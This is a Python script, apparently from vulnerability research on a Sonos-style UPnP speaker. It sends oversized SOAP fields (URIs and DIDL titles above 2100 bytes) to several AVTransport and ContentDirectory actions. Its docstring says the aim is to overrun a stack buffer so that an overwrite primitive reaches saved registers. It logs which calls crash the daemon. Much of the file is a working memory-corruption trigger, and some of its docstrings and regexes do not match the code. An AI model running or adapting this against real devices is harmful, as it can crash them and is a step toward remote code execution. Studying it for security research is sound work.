#!/usr/bin/env python3
"""nulcarrier.py - per-action cap table for the 2.1 stack-NUL carrier hunt
(bead frankensonos-z4j).

Question: which SOAP action accepts a field value > 2100 bytes (the threshold
where the object-generic copy 0x101cc878 -> 0x101ccc9c overruns its 2100-byte
stack buffer), so the stored +4208 length is big enough for the NUL/overwrite
primitive at 0x101cccd0 to reach the saved registers of frame 2160?

Actions probed (from the static enumeration in docs/RE_NUL_CARRIER.md):
  AVTransport : SetAVTransportURI, SetNextAVTransportURI, AddURIToQueue,
                CreateSavedQueue, RemoveAllTracksFromQueue (control)
  ContentDirectory: CreateObject (FV:2 and SQ: parents), UpdateObject

Each case records (http_code, upnp_error_code or OK, bytes accepted evidence).
Spacing: one SOAP call per --pace seconds (default 60) on the coordinator;
liveness /status/zp checked before and after every call; a dead daemon
aborts the run. Deterministic: fixed case list, no randomness.

usage:
  ./nulcarrier.py <IP> table [--pace 60] [--jsonl out.jsonl]
  ./nulcarrier.py <IP> setnext --uri-len 2200     # requires playback running
  ./nulcarrier.py <IP> savedqueue --title-len 2139
"""
from __future__ import annotations

import argparse
import json
import re
import subprocess
import sys
import time
from datetime import datetime, timezone

AVT = "urn:schemas-upnp-org:service:AVTransport:1"
CDS = "urn:schemas-upnp-org:service:ContentDirectory:1"

DIDL_ITEM = (
    '<DIDL-Lite xmlns="urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/"'
    ' xmlns:dc="http://purl.org/dc/elements/1.1/"'
    ' xmlns:upnp="urn:schemas-upnp-org:metadata-1-0/upnp/">'
    '<item id="1" parentID="0" restricted="1">'
    '<dc:title>{title}</dc:title>'
    '<upnp:class>object.item.audioItem.audioBroadcast</upnp:class>'
    '<res protocolInfo="http-get:*:audio/mpeg:*">{uri}</res>'
    '</item></DIDL-Lite>'
)


def now() -> str:
    return datetime.now(timezone.utc).strftime("%H:%M:%S.%f")[:-3] + "Z"


def soap(ip: str, service_ctl: str, service_type: str, action: str,
         args_xml: str, timeout: float = 20.0):
    """One SOAP call. Returns (http_code, body, curl_rc)."""
    body = ('<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"'
            ' s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>'
            '<u:%s xmlns:u="%s">%s</u:%s></s:Body></s:Envelope>'
            % (action, service_type, args_xml, action))
    p = subprocess.run(
        ["curl", "-s", "-m", str(timeout),
         "-H", 'Content-Type: text/xml; charset="utf-8"',
         "-H", 'SOAPACTION: "%s#%s"' % (service_type, action),
         "--data-binary", body, "http://%s:1400%s" % (ip, service_ctl)],
        capture_output=True, text=True)
    return p.returncode, p.stdout


def parse_result(body: str):
    """(is_fault, code, description) or (False, None, response_summary)."""
    err = re.search(r'<errorCode>(\d+)</ErrorCode>|<errorCode>(\d+)</errorCode>', body)
    if err:
        code = err.group(1) or err.group(2)
        desc = re.search(r'<errorDescription>([^<]*)</errorDescription>', body)
        return True, code, desc.group(1) if desc else ""
    if "<Fault>" in body:
        return True, "SOAP", "unparsed fault"
    ok = re.findall(r'<([A-Za-z]+)>([^<]{0,60})</\1>', body)
    return False, None, dict(ok)


def alive(ip: str) -> bool:
    p = subprocess.run(["curl", "-s", "-m", "3", "-o", "/dev/null", "-w", "%{http_code}",
                        "http://%s:1400/status/zp" % ip], capture_output=True, text=True)
    return p.stdout.strip() == "200"


def cifs_uri(span: int) -> str:
    return "x-file-cifs://h/" + "a" * max(0, span - 17) + "/x.mp3"


def didl_for(uri: str, title: str) -> str:
    return DIDL_ITEM.format(title=title, uri=uri)


# ------------------------------------------------------------- case builders

def case_setavt(ip, n):
    uri = cifs_uri(n)
    args = ('<InstanceID>0</InstanceID><CurrentURI>%s</CurrentURI>'
            '<CurrentURIMetaData></CurrentURIMetaData>' % uri)
    rc, body = soap(ip, "/MediaRenderer/AVTransport/Control", AVT,
                    "SetAVTransportURI", args)
    return rc, body


def case_setnextavt(ip, n):
    uri = cifs_uri(n)
    args = ('<InstanceID>0</InstanceID><NextURI>%s</NextURI>'
            '<NextURIMetaData></NextURIMetaData>' % uri)
    rc, body = soap(ip, "/MediaRenderer/AVTransport/Control", AVT,
                    "SetNextAVTransportURI", args)
    return rc, body


def case_addq(ip, n):
    uri = cifs_uri(n)
    args = ('<InstanceID>0</InstanceID><EnqueuedURI>%s</EnqueuedURI>'
            '<EnqueuedURIMetaData></EnqueuedURIMetaData>'
            '<DesiredFirstTrackNumberEnqueued>0</DesiredFirstTrackNumberEnqueued>'
            '<EnqueueAsNext>1</EnqueueAsNext>' % uri)
    rc, body = soap(ip, "/MediaRenderer/AVTransport/Control", AVT,
                    "AddURIToQueue", args)
    return rc, body


def case_createsq(ip, title_len):
    uri = cifs_uri(64)
    didl = didl_for(uri, "A" * title_len)
    args = ('<InstanceID>0</InstanceID><Title>CSQ</Title><EnqueuedURI>%s</EnqueuedURI>'
            '<EnqueuedURIMetaData>%s</EnqueuedURIMetaData>' % (uri, didl))
    rc, body = soap(ip, "/MediaRenderer/AVTransport/Control", AVT,
                    "CreateSavedQueue", args)
    return rc, body


def case_createobject(ip, title_len, parent="FV:2"):
    didl = didl_for(cifs_uri(64), "A" * title_len)
    args = ('<ContainerID>%s</ContainerID><Elements>%s</Elements>' % (parent, didl))
    rc, body = soap(ip, "/MediaServer/ContentDirectory/Control", CDS,
                    "CreateObject", args)
    return rc, body


CASES = [
    ("AVT/SetAVTransportURI(uri)", 0, case_setavt),
    ("AVT/SetNextAVTransportURI(uri)", 0, case_setnextavt),
    ("AVT/AddURIToQueue(uri)", 0, case_addq),
    ("AVT/CreateSavedQueue(title)", 1, case_createsq),
    ("CDS/CreateObject(FV:2,title)", 1, case_createobject),
]


def run_table(ip: str, lens_uri, lens_title, pace: float, jsonl: str | None):
    deaths = 0
    rows = []
    print(f"# {ip} cap-table pace={pace}s")
    print("action\tlen\thttp\terr\tresult")
    for name, kind, fn in CASES:
        lens = lens_title if kind else lens_uri
        for n in lens:
            if not alive(ip):
                print(f"{name}\t{n}\tSKIP\tdaemon-down\t-")
                for _ in range(30):
                    time.sleep(2)
                    if alive(ip):
                        break
                else:
                    print("abort: daemon never returned")
                    deaths += 1
                    break
            rc, body = fn(ip, n)
            fault, code, extra = parse_result(body)
            up = alive(ip)
            http = "rc%d" % rc if rc else "200?"
            print(f"{name}\t{n}\t{http}\t{code or '-'}\t{extra}", flush=True)
            rows.append({"action": name, "len": n, "http": http, "err": code,
                         "result": extra, "alive": up, "ts": now()})
            if not up:
                deaths += 1
                for _ in range(30):
                    time.sleep(2)
                    if alive(ip):
                        break
                else:
                    print("abort: daemon never returned")
                    break
            time.sleep(pace)
    if jsonl:
        with open(jsonl, "a") as fh:
            for r in rows:
                fh.write(json.dumps(r, sort_keys=True) + "\n")
    return 1 if deaths else 0


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("ip")
    ap.add_argument("mode", choices=["table", "setnext", "savedqueue"])
    ap.add_argument("--pace", type=float, default=60.0)
    ap.add_argument("--jsonl", default=None)
    ap.add_argument("--uri-lens", default="500,1000,2000,2100,2200,3000,3800")
    ap.add_argument("--title-lens", default="500,1023,1024,2000,2100,2139,3000")
    ap.add_argument("--uri-len", type=int, default=2200)
    ap.add_argument("--title-len", type=int, default=2139)
    a = ap.parse_args()

    if a.mode == "table":
        lens_uri = [int(x) for x in a.uri_lens.split(",")]
        lens_title = [int(x) for x in a.title_lens.split(",")]
        return run_table(a.ip, lens_uri, lens_title, a.pace, a.jsonl)
    if a.mode == "setnext":
        rc, body = case_setnextavt(a.ip, a.uri_len)
        fault, code, extra = parse_result(body)
        print(f"SetNextAVTransportURI len={a.uri_len} rc={rc} err={code} {extra}")
        return 0
    rc, body = case_createsq(a.ip, a.title_len)
    fault, code, extra = parse_result(body)
    print(f"CreateSavedQueue title={a.title_len} rc={rc} err={code} {extra}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
